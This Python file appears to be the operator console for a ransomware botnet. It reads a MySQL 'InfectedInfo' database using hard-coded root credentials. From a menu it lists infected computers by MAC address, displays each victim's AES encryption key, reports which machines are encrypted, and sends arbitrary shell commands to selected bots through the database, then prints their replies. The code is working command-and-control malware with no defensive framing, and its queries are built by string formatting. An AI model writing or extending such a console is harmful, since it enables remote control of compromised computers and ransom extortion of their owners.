import mysql.connector
import time

config = {
  'user': 'root',
  'password': 'toor',
  #'host': 'localhost',
  'host' : 'db',
  'database': 'InfectedInfo',
  'raise_on_warnings': True
}

connection = mysql.connector.connect(**config)

def showMacs():
    # SQL part
    cur = connection.cursor()
    numOfRows = cur.execute( "(SELECT MacAddress, Id FROM Bots )" )
    Macs = cur.fetchall()
    cur.close()

    #Print part
    counter = 0
    print     ("ID    Mac")
    for Mac in Macs:
        counter = counter + 1
        print ("%d.    %s" % (Mac[1], Mac[0]))
    return counter

def showPrivKeys():
    # SQL part
    cur = connection.cursor()
    found = cur.execute( "(SELECT AESkey, Id FROM Bots )" )
    EncKeys = cur.fetchall()
    cur.close()

    #Print part
    print     ("ID    EncKEy")
    for EncKey in EncKeys:
        print ("%d.    %s" % (EncKey[1], EncKey[0]))
    return 1

def showEncComp():
    # SQL part
    cur = connection.cursor()
    found = cur.execute( "(SELECT MacAddress FROM Bots WHERE Encrypted = 1 )" )
    Macs = cur.fetchall()
    cur.close()

    #Print part
    counter = 1
    print     ("ID    Encrypted Computers")
    for Mac in Macs:
        print ("%d.    %s" % (counter, Mac[0]))
        counter = counter + 1
    return 

def putInShellMode():
    numOfRows = showMacs()
    print("PICK ALL ID SEPERATE BY A COMMAS TO PUT IN SHELL MODE")
    numbers = input("-> ")
    for num in numbers.split(','):
        if not (num.isnumeric() and int(num) <= numOfRows):
            print ("Y04 f4ck3d 4p")
            return 
    cur = connection.cursor()
    val = cur.execute( "UPDATE Bots SET Shell=1 WHERE Id in (%s) " %  (numbers) )
    connection.commit()
    cur.close()
    LookUpAllshell()
    

def LookUpAllshell():
    cur = connection.cursor()
    cur.execute( "SELECT Id, MacAddress  FROM Bots WHERE Shell = 1 " )
    shells = cur.fetchall()
    cur.close()
    print("Theses are the infected computers with shells ")
    
    #Print part
    print     ("ID    Shells")
    for shell in shells:
        print ("%d.    %s" % (shell[0], shell[1]))

def MakeSureInShellMode():
    cur = connection.cursor()
    cur.execute( "SELECT Id, MacAddress  FROM Bots WHERE Shell = 1" )
    shells = cur.fetchall()
    cur.close()
    if len(shells) == 0:
        print ("You gotta put computers in shell mode first")
        return 0
    print()
   
    #Print part
    print     ("ID    Shells")
    for shell in shells:
        print ("%d.    %s" % (shell[0], shell[1]))
    return 1

def sendCmd(cmd, Id):
    #has to take into account cmd and rsp
    LastCmd = (1,)
    count = 0 
    while not (LastCmd[0] == None):
        cur = connection.cursor()
        cur.execute( "SELECT Cmd FROM Bots WHERE Id = '%s' " % (Id) )
        LastCmd = cur.fetchone()
        connection.commit()
        cur.close()
        count = count + 1
        if count >= 19999:
            print("The malware isn't receiving commands Debug")
            time.sleep(3)
    cur = connection.cursor()
    cur.execute( "UPDATE Bots SET  Cmd = '%s' WHERE Shell = 1 " % (cmd) )
    connection.commit()
    cur.close()
    return

def receiveCmd(Id):
    #has to take into account cmd and rsp
    LastRsp = (None,)
    count = 0 
    while (LastRsp[0] == None):
        cur = connection.cursor()
        cur.execute( "SELECT Rsp FROM Bots WHERE Id = '%s' " % (Id) )
        LastRsp = cur.fetchone()
        connection.commit()
        cur.close()
        count = count + 1
        if count >= 19999:
            print("The malware isn't receiving commands Debug")
            time.sleep(3)
    cur = connection.cursor()
    cur.execute( "UPDATE Bots SET Rsp = NULL WHERE Shell = 1 " )
    connection.commit()
    cur.close()
    return LastRsp

def Shell():
    print()
    print("You're in shell mode")
    if MakeSureInShellMode() == 0:
        return
    Id = input("Input One Id -> ")
    print()
    print("Type --help to see this shells commands")
    while True:
        cmd = input("Danx$ ")
        if "--help" == cmd:
            print("    [-] Banana           -To end shell \
                \n     [-] Wilson [number]  -To change the cmd shell you are using")
        elif "banana" in cmd.lower():
            shellCleanUp()
            break
        elif "wilson" in cmd.lower():
            print("Pick which shell ID to see All Shells below will be sent commands to")
            Id = input("-> ")
            print("You have selected Computer with Id '%s' "  % (Id) )
        else:
            sendCmd(cmd ,Id)
            rsp = receiveCmd(Id)
            print (rsp[0])
        
        

def shellCleanUp():
    cur = connection.cursor()
    cur.execute( " UPDATE Bots SET Cmd = NULL, Rsp = NULL, Shell = 0  WHERE Shell = 1 " )
    connection.commit()
    cur.close()
    return

def MainMenu():
    print()
    print ("P1c & 0pt10n")
    print ("1. Show all infected computers ")
    print ("2. Show all private keys")
    print ("3. Show which computers encrypted")
    print ("4. Select computers to put in shell mode")
    print ("5. Go to interactive shell")
    print ("6. Exit")
    print()
    num = int (input("Menu$ ") )
    if num > 0 and num < 7:
        return num
    return 0

def options(ret):
    if ret == 1:
        showMacs()
    elif ret == 2:
        showPrivKeys()
    elif ret == 3:
        showEncComp()
    elif ret == 4:
        putInShellMode()
    elif ret == 5:
        Shell() 
    elif ret == 6:
        return False   
    else:
        print("Input a number between 1-6")
    time.sleep(3)
    return True
    

def main():
    print ("W3lc0m3 2 C2 l1f3")
    while options( MainMenu()):
        print()
    connection.close()
    

if __name__ == "__main__":
    main()
